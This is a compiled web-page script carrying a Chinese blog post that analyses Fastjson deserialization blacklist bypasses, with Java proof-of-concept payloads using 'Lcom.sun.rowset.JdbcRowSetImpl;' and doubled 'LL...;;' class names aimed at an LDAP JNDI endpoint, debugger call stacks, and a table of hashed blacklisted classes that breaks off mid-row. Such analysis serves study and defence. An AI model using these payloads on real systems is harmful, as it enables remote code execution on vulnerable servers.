"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[505],{7708:(a,t)=>{t.A=(a,t)=>{const n=a.__vccOpts||a;for(const[a,s]of t)n[a]=s;return n}},8916:(a,t,n)=>{n.r(t),n.d(t,{comp:()=>na,data:()=>sa});var s=n(4754);const e=n.p+"assets/img/image-20240419113233-qhkgmuy.cf0aeeea.png",o=n.p+"assets/img/image-20240419134247-xagy54f.c647c6b6.png",d=n.p+"assets/img/image-20240419135212-1jvygzm.32c80754.png",p=n.p+"assets/img/image-20240419135253-aph23db.6c782520.png",c=n.p+"assets/img/image-20240419140035-xssht34.2a1058bf.png",r=n.p+"assets/img/image-20240419140204-pi7ika0.300bee77.png",i=n.p+"assets/img/image-20240419141937-tgs8hd5.1325ac18.png",l=n.p+"assets/img/image-20240419142124-zzgimjk.53b5300f.png",u=n.p+"assets/img/image-20240419142242-edlnq3r.750525df.png",k=n.p+"assets/img/image-20240419142744-lklfiay.38ea69ed.png",m=n.p+"assets/img/image-20240419151443-ffpk6ii.d7991987.png",b=n.p+"assets/img/image-20240419151542-bd9iqk6.010bdb66.png",g=n.p+"assets/img/image-20240419151710-im25one.58fe858e.png",v=n.p+"assets/img/image-20240419153353-tuyqjti.328e7096.png",f=n.p+"assets/img/image-20240419155911-w98hvgg.84787d95.png",x=n.p+"assets/img/image-20240419160145-yiwqf8q.28653892.png",L=n.p+"assets/img/image-20240419161207-8stryy3.534827d9.png",h=n.p+"assets/img/image-20240419161546-jk16i96.868600eb.png",j=n.p+"assets/img/image-20240419162242-yjm8w2j.2c883e7a.png",y=n.p+"assets/img/image-20240419162602-d9ilksg.50ea9f03.png",C=n.p+"assets/img/image-20240419163345-1uzf0nn.147c2b89.png",w=n.p+"assets/img/image-20240419163257-t8eh8zj.63606a19.png",E=n.p+"assets/img/image-20240419164413-uxv0sz1.2ccc436f.png",S=n.p+"assets/img/image-20240419172550-h4ad2ii.ac57e049.png",q=n.p+"assets/img/image-20240419174259-dh29efj.37af4173.png",A=(0,s.Fv)('<p><mark>历史版本补丁绕过，大前提</mark>​**<mark>都必须开启</mark>** **** <code>AutoTypeSupport=true</code>​。</p><p>在上文最后发现 1.2.24 之后的版本中，新增了 autoTypeSupport 反序列化选项，并使用 <code>checkAutoType()</code>​ 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。</p><h2 id="_1-2-25-1-2-41-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-41-补丁绕过"><span>1.2.25 - 1.2.41 补丁绕过</span></a></h2><h3 id="绕过利用-一" tabindex="-1"><a class="header-anchor" href="#绕过利用-一"><span>绕过利用（一）</span></a></h3><p>还用原来的 Demo，把 maven 依赖换成 1.2.25 可以看到如下报错，调试看看。</p><p>​<img src="'+e+'" alt="image" loading="lazy">​</p><p>‍</p><p>原因就是 <code>checkAutoType()</code>​ 函数中的黑名单过滤了 &quot;<code>com.sun.</code>​&quot;。</p><p>修改 poc 为</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}\\n&quot;</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>提示 autoType is not support. Lcom.sun.rowset.JdbcRowSetImpl; 开启 autoTypeSupport 配置。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}\\n&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p>‍</p><h3 id="调试分析-一" tabindex="-1"><a class="header-anchor" href="#调试分析-一"><span>调试分析（一）</span></a></h3><p>我们注意到，poc 和之前的不同之处在于在 &quot;<code>com.sun.rowset.JdbcRowSetImpl</code>​&quot; 类名的前面加了&quot;<code>L</code>​、后面加了 &quot;<code>;</code>​&quot; 就绕过了黑名单过滤。</p><p>调试看看绕过的原因，其实上篇也有提到一下。将断点打在 <code>checkAutoType()</code>​ 函数上，调试跟进去。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#parseObject\n  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span>#checkAutoType\n    <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>TypeUtils</span>#loadClass\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>‍</p><p>&quot;<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>​&quot; 类名由于是以 <code>L</code>​ 开头，因此并不在 denyList 黑名单中，从而绕过了黑名单校验，黑名单是绕过了，那为什么这个类能加载呢？再往下开始调用 <code>TypeUtils.loadClass()</code>​，可以看到会去掉 <code>L</code>​ 和 <code>;</code>​ 然后再加载类，因此能成功绕过。</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 调用栈</span>\ncheckAutoType<span class="token operator">:</span><span class="token number">929</span><span class="token punctuation">,</span> <span class="token class-name">ParserConfig</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparseObject<span class="token operator">:</span><span class="token number">308</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1335</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1301</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">152</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nmain<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">(</span>demo<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="绕过利用-二" tabindex="-1"><a class="header-anchor" href="#绕过利用-二"><span>绕过利用（二）</span></a></h3><p>‍</p><p>‍</p><h2 id="_1-2-25-1-2-42-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-42-补丁绕过"><span>1.2.25 - 1.2.42 补丁绕过</span></a></h2><h3 id="调试分析" tabindex="-1"><a class="header-anchor" href="#调试分析"><span>调试分析</span></a></h3><p>修改 fastjson 的版本为 <code>1.2.42</code>​，运行上面的 poc 进行查看，报错 autoType is not support. Lcom.sun.rowset.JdbcRowSetImpl; 调试看看。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>DefaultJSONParser</span>#parseObject\n  <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span>#checkAutoType\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+i+'" alt="image" loading="lazy">​</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 调用栈</span>\ncheckAutoType<span class="token operator">:</span><span class="token number">925</span><span class="token punctuation">,</span> <span class="token class-name">ParserConfig</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparseObject<span class="token operator">:</span><span class="token number">311</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1338</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1304</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">152</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nmain<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">(</span>demo<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="绕过利用" tabindex="-1"><a class="header-anchor" href="#绕过利用"><span>绕过利用</span></a></h3><p>那我们多加一层 L 和 ; 不就能绕过了吗？✌</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}\\n&quot;</span><span class="token punctuation">;</span>\n\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><h3 id="为什么在-1-2-42-之前也可以" tabindex="-1"><a class="header-anchor" href="#为什么在-1-2-42-之前也可以"><span>为什么在 1.2.42 之前也可以</span></a></h3><p>因为循环去除，所以 poc 多加几层 <code>L</code>​ 和 <code>;</code>​ 也是可以的。</p><p>处理逻辑：在 <code>L</code>​ 和 <code>;</code>​ 之间提取出类名后，会再次调用自身函数 <code>loadClass()</code>​，也就是说只要检测出 <code>L</code>​ 开头和 <code>;</code>​ 结尾的字符都会调用自身来循环提取出真正的类名。</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><p><mark>这里注意到</mark> <mark>​<code>[</code>​</mark> <mark>开头的也会进行 loadClass，会不会是下一个修复绕过点呢？</mark></p><h2 id="哈希黑名单" tabindex="-1"><a class="header-anchor" href="#哈希黑名单"><span>哈希黑名单</span></a></h2>',48),D={href:"https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd",target:"_blank",rel:"noopener noreferrer"},F=(0,s.Lk)("p",null,"通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。",-1),J={href:"https://github.com/LeadroyaL/fastjson-blacklist",target:"_blank",rel:"noopener noreferrer"},O=(0,s.Lk)("h3",{id:"背景",tabindex:"-1"},[(0,s.Lk)("a",{class:"header-anchor",href:"#背景"},[(0,s.Lk)("span",null,"背景")])],-1),N=(0,s.Lk)("code",null,"fastjson",-1),B={href:"https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd",target:"_blank",rel:"noopener noreferrer"},T=(0,s.Fv)('<div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">-</span>     <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> denyList <span class="token operator">=</span> <span class="token string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token operator">+</span>        denyHashCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>\n<span class="token operator">+</span>                <span class="token operator">-</span><span class="token number">8720046426850100497L</span><span class="token punctuation">,</span>\n<span class="token operator">+</span>                 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>\n<span class="token operator">+</span>                <span class="token number">8838294710098435315L</span>\n<span class="token operator">+</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>',1),z=(0,s.Lk)("code",null,"fastjson",-1),P={href:"https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38",target:"_blank",rel:"noopener noreferrer"},I=(0,s.Lk)("mark",null,"把黑名单从十进制数变成了十六进制数",-1),R=(0,s.Fv)('<div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>        denyHashCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>\n<span class="token operator">-</span>                <span class="token operator">-</span><span class="token number">8720046426850100497L</span><span class="token punctuation">,</span>\n<span class="token operator">-</span>                <span class="token operator">-</span><span class="token number">8165637398350707645L</span><span class="token punctuation">,</span>\n<span class="token operator">-</span>                <span class="token operator">-</span><span class="token number">8109300701639721088L</span><span class="token punctuation">,</span>\n\n<span class="token operator">+</span>                <span class="token number">0</span>x86fc2bf9beaf7aefL<span class="token punctuation">,</span>\n<span class="token operator">+</span>                <span class="token number">0</span>x8eadd40cb2a94443L<span class="token punctuation">,</span>\n<span class="token operator">+</span>                <span class="token number">0</span>x8f75f9fa0df03f80L<span class="token punctuation">,</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>',1),_=(0,s.Lk)("code",null,"fastjson",-1),W={href:"https://github.com/alibaba/fastjson/commit/014444e6c62329ec7878bb6b0c6b28c3f516c54e",target:"_blank",rel:"noopener noreferrer"},M=(0,s.Fv)('<h3 id="目前已知的列表" tabindex="-1"><a class="header-anchor" href="#目前已知的列表"><span>目前已知的列表</span></a></h3><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td>oracle.net.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td>jdk.internal.</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf